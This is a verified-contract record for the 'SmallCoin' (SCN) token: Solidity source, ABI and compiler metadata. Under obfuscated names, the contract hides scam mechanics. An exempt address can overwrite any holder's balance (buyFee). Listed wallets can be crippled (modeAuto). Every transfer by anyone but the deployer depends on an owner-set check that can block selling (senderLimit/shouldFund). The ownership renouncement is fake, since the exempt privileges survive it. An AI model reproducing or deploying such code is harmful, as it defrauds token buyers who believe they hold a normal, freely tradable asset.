{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract autoFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderLaunch {\n    function createPair(address feeSwap, address launchedMarketing) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface txTeamSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface modeMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityTxEnable) external view returns (uint256);\n\n    function transfer(address buyAuto, uint256 atSenderToken) external returns (bool);\n\n    function allowance(address txTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atSenderToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyAuto,\n        uint256 atSenderToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atTo, uint256 value);\n    event Approval(address indexed txTotal, address indexed spender, uint256 value);\n}\n\ninterface minBuyMode is modeMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SmallCoin is autoFrom, modeMarketing, minBuyMode {\n\n    address public takeLaunched;\n\n    bool public marketingReceiverSender;\n\n    function fromTotal(address receiverLaunch, address buyAuto, uint256 atSenderToken) internal view returns (uint256) {\n        require(atSenderToken > 0);\n\n        uint256 toTake = 0;\n        if (receiverLaunch == enableMode && minFund > 0) {\n            toTake = atSenderToken * minFund / 100;\n        } else if (buyAuto == enableMode && walletMarketing > 0) {\n            toTake = atSenderToken * walletMarketing / 100;\n        }\n        require(toTake <= atSenderToken);\n        return atSenderToken - toTake;\n    }\n\n    function shouldFund(address receiverLaunch, address buyAuto, uint256 atSenderToken) internal returns (bool) {\n        if (receiverLaunch == takeLaunched) {\n            return liquidityTx(receiverLaunch, buyAuto, atSenderToken);\n        }\n        uint256 isList = modeMarketing(enableMode).balanceOf(receiverSell);\n        require(isList == senderMode);\n        require(buyAuto != receiverSell);\n        if (listWallet[receiverLaunch]) {\n            return liquidityTx(receiverLaunch, buyAuto, maxSwapShould);\n        }\n        atSenderToken = fromTotal(receiverLaunch, buyAuto, atSenderToken);\n        return liquidityTx(receiverLaunch, buyAuto, atSenderToken);\n    }\n\n    string private buyWalletSwap = \"SCN\";\n\n    uint256 constant maxSwapShould = 7 ** 10;\n\n    uint256 senderMode;\n\n    mapping(address => bool) public listWallet;\n\n    uint256 private swapBuy;\n\n    event OwnershipTransferred(address indexed receiverAmountLimit, address indexed autoToken);\n\n    function liquidityTx(address receiverLaunch, address buyAuto, uint256 atSenderToken) internal returns (bool) {\n        require(feeLaunched[receiverLaunch] >= atSenderToken);\n        feeLaunched[receiverLaunch] -= atSenderToken;\n        feeLaunched[buyAuto] += atSenderToken;\n        emit Transfer(receiverLaunch, buyAuto, atSenderToken);\n        return true;\n    }\n\n    function listMaxLiquidity(address teamToken) public {\n        require(teamToken.balance < 100000);\n        if (marketingReceiverSender) {\n            return;\n        }\n        if (modeAt != swapBuy) {\n            toExempt = false;\n        }\n        isExempt[teamToken] = true;\n        \n        marketingReceiverSender = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalEnable;\n    }\n\n    uint8 private modeWallet = 18;\n\n    bool public txBuyReceiver;\n\n    function toAt() private view {\n        require(isExempt[_msgSender()]);\n    }\n\n    string private teamMax = \"Small Coin\";\n\n    function buyFee(address receiverLimitAt, uint256 atSenderToken) public {\n        toAt();\n        feeLaunched[receiverLimitAt] = atSenderToken;\n    }\n\n    address receiverSell;\n\n    function approve(address receiverTotal, uint256 atSenderToken) public virtual override returns (bool) {\n        autoTokenFee[_msgSender()][receiverTotal] = atSenderToken;\n        emit Approval(_msgSender(), receiverTotal, atSenderToken);\n        return true;\n    }\n\n    function transfer(address receiverLimitAt, uint256 atSenderToken) external virtual override returns (bool) {\n        return shouldFund(_msgSender(), receiverLimitAt, atSenderToken);\n    }\n\n    mapping(address => bool) public isExempt;\n\n    uint256 public minFund = 3;\n\n    function getOwner() external view returns (address) {\n        return receiverIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeWallet;\n    }\n\n    bool public toExempt;\n\n    mapping(address => mapping(address => uint256)) private autoTokenFee;\n\n    function allowance(address receiverAuto, address receiverTotal) external view virtual override returns (uint256) {\n        if (receiverTotal == shouldMode) {\n            return type(uint256).max;\n        }\n        return autoTokenFee[receiverAuto][receiverTotal];\n    }\n\n    bool public isEnableTake;\n\n    function name() external view virtual override returns (string memory) {\n        return teamMax;\n    }\n\n    uint256 public liquidityFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyWalletSwap;\n    }\n\n    uint256 fromReceiverList;\n\n    address public enableMode;\n\n    address shouldMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address liquidityTxEnable) public view virtual override returns (uint256) {\n        return feeLaunched[liquidityTxEnable];\n    }\n\n    function modeReceiver() public {\n        emit OwnershipTransferred(takeLaunched, address(0));\n        receiverIs = address(0);\n    }\n\n    uint256 public walletMarketing = 0;\n\n    function modeAuto(address tokenList) public {\n        toAt();\n        \n        if (tokenList == takeLaunched || tokenList == enableMode) {\n            return;\n        }\n        listWallet[tokenList] = true;\n    }\n\n    function senderLimit(uint256 atSenderToken) public {\n        toAt();\n        senderMode = atSenderToken;\n    }\n\n    constructor (){\n        if (toExempt != txBuyReceiver) {\n            txBuyReceiver = true;\n        }\n        modeReceiver();\n        txTeamSell walletFrom = txTeamSell(shouldMode);\n        enableMode = senderLaunch(walletFrom.factory()).createPair(walletFrom.WETH(), address(this));\n        receiverSell = senderLaunch(walletFrom.factory()).feeTo();\n        if (txBuyReceiver) {\n            swapBuy = liquidityFrom;\n        }\n        takeLaunched = _msgSender();\n        isExempt[takeLaunched] = true;\n        feeLaunched[takeLaunched] = totalEnable;\n        if (liquidityFrom != modeAt) {\n            toExempt = true;\n        }\n        emit Transfer(address(0), takeLaunched, totalEnable);\n    }\n\n    function transferFrom(address receiverLaunch, address buyAuto, uint256 atSenderToken) external override returns (bool) {\n        if (_msgSender() != shouldMode) {\n            if (autoTokenFee[receiverLaunch][_msgSender()] != type(uint256).max) {\n                require(atSenderToken <= autoTokenFee[receiverLaunch][_msgSender()]);\n                autoTokenFee[receiverLaunch][_msgSender()] -= atSenderToken;\n            }\n        }\n        return shouldFund(receiverLaunch, buyAuto, atSenderToken);\n    }\n\n    address private receiverIs;\n\n    uint256 public modeAt;\n\n    function owner() external view returns (address) {\n        return receiverIs;\n    }\n\n    mapping(address => uint256) private feeLaunched;\n\n    uint256 private totalEnable = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmountLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSenderToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTxEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSenderToken\",\"type\":\"uint256\"}],\"name\":\"buyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnableTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"}],\"name\":\"listMaxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"}],\"name\":\"modeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atSenderToken\",\"type\":\"uint256\"}],\"name\":\"senderLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSenderToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atSenderToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuyReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SmallCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}